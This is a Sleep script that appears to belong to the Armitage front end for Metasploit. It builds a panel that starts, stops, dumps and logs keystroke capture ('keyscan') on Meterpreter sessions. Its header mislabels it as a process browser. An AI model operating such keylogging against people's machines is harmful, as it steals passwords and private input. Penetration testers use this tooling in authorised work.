#
# Process Browser (for Meterpreter)
#

import table.*;

import java.awt.*;
import java.awt.event.*;

import javax.swing.*;
import javax.swing.event.*;
import javax.swing.text.*;

global('%keyscans');
%keyscans = ohash();
setMissPolicy(%keyscans, { return [new PlainDocument]; });

sub parseKeyscans {
	if ($0 eq "begin") {
		local('$document');
		$document = %keyscans[$1];
		[$document insertString: [$document getLength], "$2 $+ \n", $null];
		logNow("keyscan", sessionToHost($1), "$2 $+ \n");
	}
}

%handlers["keyscan_dump"] = &parseKeyscans;

sub createKeyscanViewer {
	local('$table $model $panel $top $text');

	$panel = [new JPanel];
	[$panel setLayout: [new BorderLayout]];

	$text = [new JTextArea: %keyscans[$1]];
	[$text setEditable: 0];
	[$text setLineWrap: 1];
	[$panel add: [new JScrollPane: $text], [BorderLayout CENTER]];

	local('$a $b $c $d $buttons');
	$a = [new JButton: "Start"];
	[$a addActionListener: lambda({ 
		oneTimeShow("keyscan_start");
		m_cmd($m, "keyscan_start"); 
	}, $m => $1)];

	$b = [new JButton: "Stop"];
	[$b addActionListener: lambda({ 
		oneTimeShow("keyscan_stop");
		m_cmd($m, "keyscan_stop"); 
	}, $m => $1)];

	$c = [new JButton: "Dump"];
	[$c addActionListener: lambda({
		m_cmd($m, "keyscan_dump"); 
	}, $m => $1)];

	$d = [new JButton: "Clear"];
	[$d addActionListener: lambda({
		local('$document');
		$document = %keyscans[$m];
		[$document replace: 0, [$document getLength], "", $null];
	}, $m => $1)];

	$buttons = [new JPanel];
	[$buttons setLayout: [new FlowLayout: [FlowLayout CENTER]]];
	[$buttons add: $a];
	[$buttons add: $b];
	[$buttons add: $d];
	[$buttons add: $c];

	[$panel add: $buttons, [BorderLayout SOUTH]];

	[$frame addTab: "Keyscan $1", $panel, $null];
}
